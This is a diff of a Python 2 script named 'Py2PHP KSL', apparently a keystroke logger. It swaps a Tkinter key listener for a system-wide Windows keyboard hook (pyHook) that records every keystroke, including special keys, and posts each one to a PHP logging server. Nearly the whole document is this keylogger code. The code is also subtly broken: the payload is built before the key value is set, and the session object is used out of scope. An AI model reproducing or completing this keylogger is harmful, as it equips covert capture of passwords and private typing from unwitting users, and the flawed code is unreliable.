@@ -7,10 +7,14 @@
 # Py2PHP KSL
 # By Pythogen
 
-# Module responsible for POST data communication
+# Load modules
+from ctypes import *
+import pythoncom
+import pyHook
+import win32clipboard
+import sys
+# Temp module
 import requests
-# Module responsible for gathering input
-import Tkinter as tk
 
 # URL to PHP Server to transfer logs.
 log2url = 'http://127.0.0.1:7777/log/index.php'
@@ -32,24 +36,19 @@ def Main():
 	# Shorten method identifier..
 	with requests.Session() as c:
 
-		# Loop endlessly.
-		while(True):
-
-			# Listener function prep for bind
-			ksl = tk.Tk()
-
-			# Bind and wait for key input.
-			ksl.bind('<KeyPress>', onKeyPress)
-
-			# Test reasons
-			x = raw_input("wait")
+		# Create hook
+		kl = pyHook.HookManager()
+		kl.KeyDown = KeyIN
+		# Register hook and register
+		kl.HookKeyboard()
+		pythoncom.PumpMessages()
 
 
-# Listen for keystrokes.
-def onKeyPress(event):
+# Key input function
+def KeyIN(event):
 
 	# Variable storing specific key stroke
-	charRep = event.char
+	charRep = chr(event.Ascii)
 
 	# Dictionary containing sendabe data.
 	toPHP = \
@@ -58,11 +57,26 @@ def onKeyPress(event):
 		'Key' : charRep,
 	}
 
-	# Print Key pressed, then..
-	print 'Console: Pressed %s.' % (event.char) 
+	# Detect letter AND numerical keys
+	if event.Ascii > 32 and event.Ascii < 127:
+		sys.stdout.write(chr(event.Ascii))
+		charRep = chr(event.Ascii)
+
+	# Detect space bar input specifically
+	elif event.Ascii == 32:
+		print " ",
+		charRep = " "
+
+	# Detect special input such as Tab, Shift, etc..
+	else:
+		print " [%s] " % event.Key,
+		charRep = " [%s] " % event.Key,
 
 	# Send key to PHP file.
 	c.post(log2url, params=toPHP)
+
+	# Return to hook
+	return True
 
 # Call Main routine.
 Main()
